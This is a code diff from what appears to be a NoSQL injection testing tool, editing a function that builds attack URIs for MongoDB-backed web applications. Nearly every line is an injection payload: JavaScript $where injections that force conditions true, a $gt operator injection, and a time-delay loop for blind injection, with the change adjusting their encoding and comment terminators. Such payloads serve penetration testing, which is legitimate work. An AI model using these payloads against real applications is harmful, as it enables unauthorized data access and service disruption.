@@ -11,7 +11,7 @@ def buildAttackUri(origUri, randValue):
     attackSet[6]="=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
     attackSet[7]="=1; return this.a !=" + randValue + "; var dummy=1" + "&"
     attackSet[8]="[$gt]=1&"
-    attackSet[9] = "=2;return%20true;}///"
+    attackSet[9] = "=2;return true;}///"
 #    attackSet[9]="=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
 #    attackSet[10]="=a\"; return db.a.find(); var dummy='!" + "&"
 #    attackSet[11]="=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
@@ -21,7 +21,7 @@ def buildAttackUri(origUri, randValue):
 #    attackSet[15]="1; return true; var dum=2"
 #    attackSet[16]="=a\'; ---"
 #    attackSet[17]="=1; if ---"
-    attackSet[10]="=12;var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/100 < 10); return true;}//"
+    attackSet[10]="=12;var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/100 < 10); return true;}///"
     paramName = []
     paramValue = []
     uriArray = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
